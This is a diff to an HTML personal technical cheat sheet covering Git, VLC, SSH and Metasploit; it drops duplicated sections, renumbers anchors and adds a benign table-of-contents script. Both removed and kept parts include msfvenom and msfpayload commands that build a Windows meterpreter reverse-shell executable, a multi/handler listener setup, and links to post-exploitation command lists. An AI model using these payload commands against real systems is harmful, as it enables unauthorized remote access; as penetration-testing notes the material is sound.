@@ -30,47 +30,9 @@ code > span.er { font-weight: bold; }
 <body>
 <div id="TOC">
 <ul>
-<li><a href="#git">GIT</a><ul>
-<li><a href="#ressources">Ressources</a><ul>
-<li><a href="#fichier-de-configuration-.gitconfig">Fichier de configuration .gitconfig</a></li>
-<li><a href="#fichier-de-configuration-.gitignore">Fichier de configuration .gitignore</a></li>
-<li><a href="#script-dajout-didentité">Script d’ajout d’identité</a></li>
-</ul></li>
-<li><a href="#useful-commands">Useful commands</a><ul>
-<li><a href="#change-log-information">Change log information</a></li>
-<li><a href="#récupérer-les-modifications-présentes-sur-le-serveur">Récupérer les modifications présentes sur le serveur</a></li>
-<li><a href="#mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant">Mettre à jour le dépôt local par rapport au dépôt distant</a></li>
-<li><a href="#faire-un-commit-local">Faire un commit local</a></li>
-<li><a href="#pousser-les-modifications-sur-le-serveur">Pousser les modifications sur le serveur</a></li>
-<li><a href="#créer-une-branche-sur-un-serveur-remote">Créer une branche sur un serveur (remote)</a></li>
-<li><a href="#merger-2-branches">Merger 2 branches</a></li>
-<li><a href="#supprimer-une-branche-locale">Supprimer une branche locale</a></li>
-<li><a href="#delete-a-remote-branch">Delete a Remote Branch</a></li>
-</ul></li>
-</ul></li>
-<li><a href="#metasploit">Metasploit</a><ul>
-<li><a href="#genration-de-payload-executables">Genration de payload executables</a><ul>
-<li><a href="#manuel">Manuel</a></li>
-<li><a href="#exemple">Exemple</a><ul>
-<li><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></li>
-<li><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></li>
-</ul></li>
-<li><a href="#alternative">Alternative</a></li>
-</ul></li>
-<li><a href="#lancement-de-handler">Lancement de handler</a></li>
-</ul></li>
-<li><a href="#vlc">VLC</a><ul>
-<li><a href="#transcoding">Transcoding</a><ul>
-<li><a href="#vers-mp4">vers MP4</a></li>
-<li><a href="#vers-avi">vers AVI</a></li>
-</ul></li>
-<li><a href="#options-utiles">Options utiles</a></li>
-<li><a href="#net-casting-http">Net casting http</a></li>
-<li><a href="#devices">Devices</a></li>
-</ul></li>
 <li><a href="#post-exploitation-command-list">Post-Exploitation Command List</a><ul>
 <li><a href="#linux-unix-bsd">Linux Unix BSD</a></li>
-<li><a href="#metasploit-1">Metasploit</a></li>
+<li><a href="#metasploit">Metasploit</a></li>
 <li><a href="#obscuresystemsaixembedded">ObscureSystemsAIXEmbedded</a></li>
 <li><a href="#osx">OSX</a></li>
 <li><a href="#windows">Windows</a></li>
@@ -108,16 +70,16 @@ code > span.er { font-weight: bold; }
 <li><a href="#tests">TESTS</a><ul>
 <li><a href="#toto">TOTO</a></li>
 </ul></li>
-<li><a href="#metasploit-2">Metasploit</a><ul>
-<li><a href="#genration-de-payload-executables-1">Genration de payload executables</a><ul>
-<li><a href="#manuel-1">Manuel</a></li>
-<li><a href="#exemple-1">Exemple</a><ul>
-<li><a href="#lister-les-options-dun-payload-1">Lister les options d’un payload</a></li>
-<li><a href="#créer-un-payload-meterpreter-pour-windows-1">Créer un payload meterpreter pour windows</a></li>
+<li><a href="#metasploit-1">Metasploit</a><ul>
+<li><a href="#genration-de-payload-executables">Genration de payload executables</a><ul>
+<li><a href="#manuel">Manuel</a></li>
+<li><a href="#exemple">Exemple</a><ul>
+<li><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></li>
+<li><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></li>
 </ul></li>
-<li><a href="#alternative-1">Alternative</a></li>
+<li><a href="#alternative">Alternative</a></li>
 </ul></li>
-<li><a href="#lancement-de-handler-1">Lancement de handler</a></li>
+<li><a href="#lancement-de-handler">Lancement de handler</a></li>
 </ul></li>
 <li><a href="#ssh">SSH</a><ul>
 <li><a href="#copy-ssh-keys-to-userhost-to-enable-password-less-ssh-logins">copy ssh keys to user@host to enable password-less ssh logins</a></li>
@@ -146,175 +108,21 @@ code > span.er { font-weight: bold; }
 <li><a href="#transfer-ssh-public-key-to-another-machine-in-one-step">transfer ssh public key to another machine in one step</a></li>
 <li><a href="#copy-stdin-to-your-x11-buffer">copy stdin to your x11 buffer</a></li>
 </ul></li>
-<li><a href="#vlc-1">VLC</a><ul>
-<li><a href="#transcoding-1">Transcoding</a><ul>
-<li><a href="#vers-mp4-1">vers MP4</a></li>
-<li><a href="#vers-avi-1">vers AVI</a></li>
+<li><a href="#vlc">VLC</a><ul>
+<li><a href="#transcoding">Transcoding</a><ul>
+<li><a href="#vers-mp4">vers MP4</a></li>
+<li><a href="#vers-avi">vers AVI</a></li>
 </ul></li>
-<li><a href="#options-utiles-1">Options utiles</a></li>
-<li><a href="#net-casting-http-1">Net casting http</a></li>
-<li><a href="#devices-1">Devices</a></li>
+<li><a href="#options-utiles">Options utiles</a></li>
+<li><a href="#net-casting-http">Net casting http</a></li>
+<li><a href="#devices">Devices</a></li>
 </ul></li>
 </ul>
 </div>
-<h1 id="git"><a href="#TOC">GIT</a></h1>
-<h2 id="ressources"><a href="#TOC">Ressources</a></h2>
-<h3 id="fichier-de-configuration-.gitconfig"><a href="#TOC">Fichier de configuration .gitconfig</a></h3>
-<p>Ce fichier permet de paramétrer git, notamment pour préciser les variables d’environnement et les alias de commandes. <a href="../ressources/.gitconfig">Voir dans les ressources</a></p>
-<h3 id="fichier-de-configuration-.gitignore"><a href="#TOC">Fichier de configuration .gitignore</a></h3>
-<p>Ce fichier permet de préciser les fichiers qui doivent être ignorés par Git. Pour ce faire, il doit être mentionné dans le .gitconfig comme suit :</p>
-<pre><code>[core]
-    excludesfile = /home/&lt;username&gt;/.gitignore</code></pre>
-<p>Voici un exemple de fichier :</p>
-<pre><code>_build*
-_inst*
-*.o
-*~
-Thumbs.db</code></pre>
-<h3 id="script-dajout-didentité"><a href="#TOC">Script d’ajout d’identité</a></h3>
-<p>Ce script a pour but de ne plus avoir à saisir le mot de passe de sa clé privé à chaque connexion. /!\ L’utilisation de ce script nuit à votre sécurité.</p>
-<p>Voici le fichier :</p>
-<pre><code>var=`ssh-agent -s`
-eval &quot;$var&quot;
-ssh-add ~/.ssh/id_dsa ~/.ssh/id_rsa
-unset var</code></pre>
-<p>Pour l’utiliser, il faut le sourcer comme suit ou l’intégrer à votre .bashrc :</p>
-<pre><code>. ~/.ssh-add-identity</code></pre>
-<h2 id="useful-commands"><a href="#TOC">Useful commands</a></h2>
-<h3 id="change-log-information"><a href="#TOC">Change log information</a></h3>
-<pre><code>git filter-branch -f --env-filter &quot;GIT_AUTHOR_NAME=&#39;Newname&#39;; GIT_AUTHOR_EMAIL=&#39;newemail&#39;; GIT_COMMITTER_NAME=&#39;Newname&#39;; GIT_COMMITTER_EMAIL=&#39;newemail&#39;;&quot; HEAD</code></pre>
-<h3 id="récupérer-les-modifications-présentes-sur-le-serveur"><a href="#TOC">Récupérer les modifications présentes sur le serveur</a></h3>
-<pre><code>git fetch
-git rebase origin/&lt;Nom de la branche par rapport à qui se mettre à jour&gt;
-#exemple :
-git rebase origin/master</code></pre>
-<h3 id="mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant"><a href="#TOC">Mettre à jour le dépôt local par rapport au dépôt distant</a></h3>
-<pre><code>git fra</code></pre>
-<h3 id="faire-un-commit-local"><a href="#TOC">Faire un commit local</a></h3>
-<pre><code>git status  # voir le status des fichiers
-git add &lt;Nouveaux fichiers&gt;
-git commit -m &#39;&lt;Message de commit&gt;&#39;</code></pre>
-<h3 id="pousser-les-modifications-sur-le-serveur"><a href="#TOC">Pousser les modifications sur le serveur</a></h3>
-<pre><code>git push</code></pre>
-<h3 id="créer-une-branche-sur-un-serveur-remote"><a href="#TOC">Créer une branche sur un serveur (remote)</a></h3>
-<pre><code> git push origin master:refs/heads/testing
- git cob testing          
- echo chiche_branch &gt; test
- git ci -a -m &#39;Chiche test&#39;
- git push                              # Attention, push toutes les branches où des commits ont été faits
-                                             # Préférez donc cette version du push:
- git push origin testing    # Vous précisez la branche testing à pusher dans origin (le serveur)</code></pre>
-<p>ou bien</p>
-<pre><code>git push origin master:refs/heads/testing     # will create the branch staging in the origin repository by copying the local master branch</code></pre>
-<h3 id="merger-2-branches"><a href="#TOC">Merger 2 branches</a></h3>
-<pre><code>git br crazy_idea
-git br
-    experimental
-    crazy_idea
-  * master
-git co crazy_idea
-git merge experimental       # merge experimental dans crazy_idea
-                             # Si il ya des conflits =&gt; git diff et git status montreront les problemes
- git commit -a               # commit all changes</code></pre>
-<h3 id="supprimer-une-branche-locale"><a href="#TOC">Supprimer une branche locale</a></h3>
-<pre><code> git branch -d experimental          #Cette commande s&#39;assure que les changement de la branche &#39;experimental&#39; 
-                                     #  se trouve dans la branche courante.
- git branch -D crazy_idea            # Si vous développez une idée folle, puis le regrettez, vous pouvez 
-                                     #  toujours effacer cette branche avec -D</code></pre>
-<h3 id="delete-a-remote-branch"><a href="#TOC">Delete a Remote Branch</a></h3>
-<pre><code>git push origin :testing                      #will delete the branch staging from the origin repository.</code></pre>
-<h1 id="metasploit"><a href="#TOC">Metasploit</a></h1>
-<h2 id="genration-de-payload-executables"><a href="#TOC">Genration de payload executables</a></h2>
-<h3 id="manuel"><a href="#TOC">Manuel</a></h3>
-<pre><code># msfvenom -h
-Usage: /opt/framework/msf3/msfvenom [options] 
-
-Options:
-    -p, --payload    [payload]       Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads
-    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all
-    -n, --nopsled    [length]        Prepend a nopsled of [length] size on to the payload
-    -f, --format     [format]        Format to output results in: raw, ruby, rb, perl, pl, bash, sh, c, js_be, js_le, java, dll, exe, exe-small, elf, macho, vba, vbs, loop-vbs, asp, war
-    -e, --encoder    [encoder]       The encoder to use
-    -a, --arch       [architecture]  The architecture to use
-        --platform   [platform]      The platform of the payload
-    -s, --space      [length]        The maximum size of the resulting payload
-    -b, --bad-chars  [list]          The list of characters to avoid example: &#39;\x00\xff&#39;
-    -i, --iterations [count]         The number of times to encode the payload
-    -c, --add-code   [path]          Specify an additional win32 shellcode file to include
-    -x, --template   [path]          Specify a custom executable file to use as a template
-    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
-    -h, --help                       Show this message</code></pre>
-<h3 id="exemple"><a href="#TOC">Exemple</a></h3>
-<h4 id="lister-les-options-dun-payload"><a href="#TOC">Lister les options d’un payload</a></h4>
-<pre><code># msfvenom -p windows/meterpreter/reverse_tcp -o</code></pre>
-<h4 id="créer-un-payload-meterpreter-pour-windows"><a href="#TOC">Créer un payload meterpreter pour windows</a></h4>
-<pre><code># msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 &gt; windobReverseMeterpreter5555.exe</code></pre>
-<h3 id="alternative"><a href="#TOC">Alternative</a></h3>
-<pre><code># msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe</code></pre>
-<h2 id="lancement-de-handler"><a href="#TOC">Lancement de handler</a></h2>
-<pre><code># msfcli multi/handler LPORT=5555 E
-
-
-use payload/linux/x86/meterpreter/bind_tcp
-
-use payload/windows/meterpreter/bind_tcp
-set LPORT 8888
-show options
-generate -t exe -f /root/meterpreter6666.exe
-exploit
-
-
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/bind_tcp
-set RHOST 192.168.0.1
-set LPORT 8888
-exploit</code></pre>
-<p><a href="https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools">https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools</a></p>
-<h1 id="vlc"><a href="#TOC">VLC</a></h1>
-<h2 id="transcoding"><a href="#TOC">Transcoding</a></h2>
-<h3 id="vers-mp4"><a href="#TOC">vers MP4</a></h3>
-<pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mpga,ab=192,scale=1,channels=2}:standard{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; 
-&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mp4a}:std{access=file,mux=mp4,dst=&#39;output.mp4&#39;}&quot; </code></pre>
-<h3 id="vers-avi"><a href="#TOC">vers AVI</a></h3>
-<pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp:sout=&quot;#transcode{vcodec=div3,vb=4000,fps=25,acodec=mp3,ab=192,channels=2,samplerate=48000,audio-sync,deinterlace,scale=1}:std{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; </code></pre>
-<h2 id="options-utiles"><a href="#TOC">Options utiles</a></h2>
-<pre><code>--audio, --no-audio Activer l&#39;audio (activé par défaut)
---start-time &lt;second&gt; Démarre la vidéo à un temps donné
---stop-time &lt;second&gt; Arrêtes la vidéo à un temps donné
--I dummy N&#39;ouvre pas l&#39;interface graphique
-vlc://quit A mettre en fin de ligne pour fermer vlc</code></pre>
-<h2 id="net-casting-http"><a href="#TOC">Net casting http</a></h2>
-<pre><code>vlc -I dummy v4l2:///dev/video0 --no-audio --sout &#39;#transcode{vcodec=mp4v,acodec=mpga,vb=900,ab=128}:std{access=http,mux=ogg,dst=192.168.0.227:8080}&#39;
-
-vlc http://ip:port</code></pre>
-<h2 id="devices"><a href="#TOC">Devices</a></h2>
-<pre><code>Stream MRL syntax:
-  [[access][/demux]://]URL[#[title][:chapter][-[title][:chapter]]]
-  [:option=value ...]
-
-  Many of the global --options can also be used as MRL specific :options.
-  Multiple :option=value pairs can be specified.
-
-URL syntax:
-  file:///path/file              Plain media file
-  http://host[:port]/file        HTTP URL
-  ftp://host[:port]/file         FTP URL
-  mms://host[:port]/file         MMS URL
-  screen://                      Screen capture
-  dvd://[device]                 DVD device
-  vcd://[device]                 VCD device
-  cdda://[device]                Audio CD device
-  udp://[[&lt;source address&gt;]@[&lt;bind address&gt;][:&lt;bind port&gt;]]
-                                 UDP stream sent by a streaming server
-  vlc://pause:&lt;seconds&gt;          Pause the playlist for a certain time
-  vlc://quit                     Special item to quit VLC
-
-v4l2:///dev/video0
-cdrom://</code></pre>
 <h1 id="post-exploitation-command-list"><a href="#TOC">Post-Exploitation Command List</a></h1>
 <h2 id="linux-unix-bsd"><a href="#TOC">Linux Unix BSD</a></h2>
 <p><a href="../ressources/Post-ExploitationCommandList/LinuxUnixBSD/LinuxUnixBSDPostExploitationCommandList.html">Linux Unix BSD</a></p>
-<h2 id="metasploit-1"><a href="#TOC">Metasploit</a></h2>
+<h2 id="metasploit"><a href="#TOC">Metasploit</a></h2>
 <p><a href="../ressources/Post-ExploitationCommandList/Metasploit/MetasploitPostExploitationCommandList.html">Metasploit</a></p>
 <h2 id="obscuresystemsaixembedded"><a href="#TOC">ObscureSystemsAIXEmbedded</a></h2>
 <p><a href="../ressources/Post-ExploitationCommandList/ObscureSystemsAIXEmbedded/ObscureSystems_AIXEmbededetc_PostExploitComma.html">ObscureSystemsAIXEmbedded</a></p>
@@ -1240,9 +1048,9 @@ printf(<span class="st">&quot;toto&quot;</span>);
 <span class="kw">return</span> <span class="dv">0</span>;
 }</code></pre>
 <pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">echo</span> <span class="st">&quot;toto&quot;</span> <span class="kw">|grep</span> toto</code></pre>
-<h1 id="metasploit-2"><a href="#TOC">Metasploit</a></h1>
-<h2 id="genration-de-payload-executables-1"><a href="#TOC">Genration de payload executables</a></h2>
-<h3 id="manuel-1"><a href="#TOC">Manuel</a></h3>
+<h1 id="metasploit-1"><a href="#TOC">Metasploit</a></h1>
+<h2 id="genration-de-payload-executables"><a href="#TOC">Genration de payload executables</a></h2>
+<h3 id="manuel"><a href="#TOC">Manuel</a></h3>
 <pre><code># msfvenom -h
 Usage: /opt/framework/msf3/msfvenom [options] 
 
@@ -1261,14 +1069,14 @@ Options:
     -x, --template   [path]          Specify a custom executable file to use as a template
     -k, --keep                       Preserve the template behavior and inject the payload as a new thread
     -h, --help                       Show this message</code></pre>
-<h3 id="exemple-1"><a href="#TOC">Exemple</a></h3>
-<h4 id="lister-les-options-dun-payload-1"><a href="#TOC">Lister les options d’un payload</a></h4>
+<h3 id="exemple"><a href="#TOC">Exemple</a></h3>
+<h4 id="lister-les-options-dun-payload"><a href="#TOC">Lister les options d’un payload</a></h4>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -o</code></pre>
-<h4 id="créer-un-payload-meterpreter-pour-windows-1"><a href="#TOC">Créer un payload meterpreter pour windows</a></h4>
+<h4 id="créer-un-payload-meterpreter-pour-windows"><a href="#TOC">Créer un payload meterpreter pour windows</a></h4>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 &gt; windobReverseMeterpreter5555.exe</code></pre>
-<h3 id="alternative-1"><a href="#TOC">Alternative</a></h3>
+<h3 id="alternative"><a href="#TOC">Alternative</a></h3>
 <pre><code># msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe</code></pre>
-<h2 id="lancement-de-handler-1"><a href="#TOC">Lancement de handler</a></h2>
+<h2 id="lancement-de-handler"><a href="#TOC">Lancement de handler</a></h2>
 <pre><code># msfcli multi/handler LPORT=5555 E
 
 
@@ -1362,24 +1170,24 @@ example: echo w00t, i’m 733+ | cstream -b1 -t2</code></pre>
 <pre><code>ssh-keygen; ssh-copy-id user@host; ssh user@host</code></pre>
 <h2 id="copy-stdin-to-your-x11-buffer"><a href="#TOC">copy stdin to your x11 buffer</a></h2>
 <pre><code>ssh user@host cat /path/to/some/file | xclip</code></pre>
-<h1 id="vlc-1"><a href="#TOC">VLC</a></h1>
-<h2 id="transcoding-1"><a href="#TOC">Transcoding</a></h2>
-<h3 id="vers-mp4-1"><a href="#TOC">vers MP4</a></h3>
+<h1 id="vlc"><a href="#TOC">VLC</a></h1>
+<h2 id="transcoding"><a href="#TOC">Transcoding</a></h2>
+<h3 id="vers-mp4"><a href="#TOC">vers MP4</a></h3>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mpga,ab=192,scale=1,channels=2}:standard{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; 
 &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mp4a}:std{access=file,mux=mp4,dst=&#39;output.mp4&#39;}&quot; </code></pre>
-<h3 id="vers-avi-1"><a href="#TOC">vers AVI</a></h3>
+<h3 id="vers-avi"><a href="#TOC">vers AVI</a></h3>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp:sout=&quot;#transcode{vcodec=div3,vb=4000,fps=25,acodec=mp3,ab=192,channels=2,samplerate=48000,audio-sync,deinterlace,scale=1}:std{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; </code></pre>
-<h2 id="options-utiles-1"><a href="#TOC">Options utiles</a></h2>
+<h2 id="options-utiles"><a href="#TOC">Options utiles</a></h2>
 <pre><code>--audio, --no-audio Activer l&#39;audio (activé par défaut)
 --start-time &lt;second&gt; Démarre la vidéo à un temps donné
 --stop-time &lt;second&gt; Arrêtes la vidéo à un temps donné
 -I dummy N&#39;ouvre pas l&#39;interface graphique
 vlc://quit A mettre en fin de ligne pour fermer vlc</code></pre>
-<h2 id="net-casting-http-1"><a href="#TOC">Net casting http</a></h2>
+<h2 id="net-casting-http"><a href="#TOC">Net casting http</a></h2>
 <pre><code>vlc -I dummy v4l2:///dev/video0 --no-audio --sout &#39;#transcode{vcodec=mp4v,acodec=mpga,vb=900,ab=128}:std{access=http,mux=ogg,dst=192.168.0.227:8080}&#39;
 
 vlc http://ip:port</code></pre>
-<h2 id="devices-1"><a href="#TOC">Devices</a></h2>
+<h2 id="devices"><a href="#TOC">Devices</a></h2>
 <pre><code>Stream MRL syntax:
   [[access][/demux]://]URL[#[title][:chapter][-[title][:chapter]]]
   [:option=value ...]
@@ -1407,5 +1215,109 @@ cdrom://</code></pre>
   &copy; 2012 <a href="http://https://github.com/phil2600/tech-scribe/">Tech-Scribe</a>
 </div>
 
+<script language="JavaScript">
+
+function getRootNode(rootName)
+{
+  var toc = document.getElementById(rootName);
+  var navList = null;
+
+  for (var i = 0; i < toc.childNodes.length; i++)
+  {
+    var node = toc.childNodes[i];
+    if (node.tagName == "UL")
+    {
+      return node;
+    }
+  }
+}
+
+function expandListHideAll(rootName)
+{
+  lvl0 = getRootNode(rootName);
+
+  for (var i = 0; i < lvl0.childNodes.length; i++)
+  {
+    var lvl1 = lvl0.childNodes[i];
+    if (lvl1.tagName == "LI")
+    {
+      for (var j = 0; j < lvl1.childNodes.length; j++)
+      {
+        var lvl2 = lvl1.childNodes[j];
+        if (lvl2.tagName == "UL")
+        {
+          for (var k = 0; k < lvl2.childNodes.length; k++)
+          {
+            var node = lvl2.childNodes[k];
+            if (node.tagName == "LI")
+            {
+              for (var l = 0; l < node.childNodes.length; l++)
+              {
+                var childNode = node.childNodes[l];
+                if (childNode.tagName == "UL")
+                {
+                  childNode.style.display = "none";
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+function expandListExpand(e, parent)
+{
+  expandListHideAll(parent);
+
+  for (var j = 0; j < e.childNodes.length; j++)
+  {
+    if (e.childNodes[j].tagName == "UL")
+    {
+      e.childNodes[j].style.display = "block";
+    }
+  }
+}
+
+function expandListAdd(rootName)
+{
+  lvl0 = getRootNode(rootName);
+
+  for (var i = 0; i < lvl0.childNodes.length; i++)
+  {
+    var lvl1 = lvl0.childNodes[i];
+    if (lvl1.tagName == "LI")
+    {
+      for (var j = 0; j < lvl1.childNodes.length; j++)
+      {
+        var lvl2 = lvl1.childNodes[j];
+        if (lvl2.tagName == "UL")
+        {
+          for (var k = 0; k < lvl2.childNodes.length; k++)
+          {
+            var node = lvl2.childNodes[k];
+            if (node.tagName == "LI")
+            {
+              node.onmouseover = function(){expandListExpand(this, rootName)};
+
+              for (var l = 0; l < node.childNodes.length; l++)
+              {
+                var childNode = node.childNodes[l];
+                if (childNode.tagName == "UL")
+                {
+                  childNode.style.display = "none";
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+expandListAdd("TOC");
+</script>
 </body>
 </html>
